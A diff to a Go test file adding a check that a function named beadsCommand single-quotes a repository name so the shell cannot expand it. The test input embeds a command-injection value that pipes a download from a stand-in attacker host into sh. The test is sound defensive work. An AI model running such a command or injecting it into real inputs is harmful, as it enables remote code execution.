@@ -351,6 +351,24 @@ func TestBeadsCommandShortSHA(t *testing.T) {
 	}
 }
 
+func TestBeadsCommandShellEscape(t *testing.T) {
+	event := Event{
+		Type:     "review.failed",
+		JobID:    1,
+		Repo:     "/repo",
+		RepoName: "$(curl attacker.com|sh)",
+		SHA:      "abc123",
+	}
+	cmd := beadsCommand(event)
+	// Must use single quotes so the shell does not expand $()
+	if strings.Contains(cmd, `"$(curl`) {
+		t.Errorf("title must not be double-quoted; got %q", cmd)
+	}
+	if !strings.Contains(cmd, "'") {
+		t.Errorf("title should be single-quoted; got %q", cmd)
+	}
+}
+
 func TestResolveCommand(t *testing.T) {
 	event := Event{
 		Type:  "review.failed",
